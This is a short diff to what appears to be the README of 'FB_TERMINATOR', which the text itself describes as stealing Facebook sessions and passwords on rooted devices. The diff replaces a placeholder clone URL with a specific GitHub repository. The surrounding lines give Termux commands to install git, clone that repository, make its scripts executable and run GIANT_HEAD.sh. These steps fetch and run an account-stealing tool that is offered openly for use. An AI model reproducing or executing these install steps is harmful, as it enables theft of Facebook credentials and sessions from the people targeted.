@@ -8,7 +8,7 @@ Steals Facebook sessions + passwords (rooted devices)
 termux-setup-storage  
 termux-change-repo  
 pkg install git  
-git clone https://github.com/yourusername/FB_TERMINATOR  
+git clone https://github.com/Veran350/FB_TERMINATOR  
 cd FB_TERMINATOR  
 chmod +x termux/*  
 ./termux/GIANT_HEAD.sh  
